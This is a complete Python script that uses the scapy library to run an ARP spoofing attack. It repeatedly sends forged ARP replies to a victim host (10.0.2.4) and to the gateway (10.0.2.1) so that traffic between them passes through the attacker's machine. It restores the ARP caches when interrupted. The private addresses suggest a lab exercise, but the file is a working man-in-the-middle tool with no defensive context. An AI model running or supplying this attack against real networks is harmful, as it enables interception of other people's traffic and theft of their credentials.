import scapy.all as scapy
import time

def get_mac_adress(ip):
    arp_request_packet = scapy.ARP(pdst=ip) #arp request
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #broadcast
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0] #taking only answered list with [0]

    return answered_list[0][1].hwsrc

def arp_poisoning(target_ip,poisoned_ip):

    target_mac = get_mac_adress(target_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)
    #scapy.ls(scapy.ARP())

def reset_arp_poison(fooled_ip,gateway_ip):

    fooled_mac = get_mac_adress(fooled_ip)
    gateway_mac = get_mac_adress(gateway_ip)
    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwsrc=gateway_mac)
    scapy.send(arp_response,verbose=False,count=6)

number = 0
try:
    while True:
        arp_poisoning("10.0.2.4","10.0.2.1")
        arp_poisoning("10.0.2.1","10.0.2.4")
        number += 2
        print("\rsending packets..." + str(number), end="")
        time.sleep(3)
except KeyboardInterrupt :
    print("\nquit and reset")
    reset_arp_poison("10.0.2.4","10.0.2.1")
    reset_arp_poison("10.0.2.1", "10.0.2.4")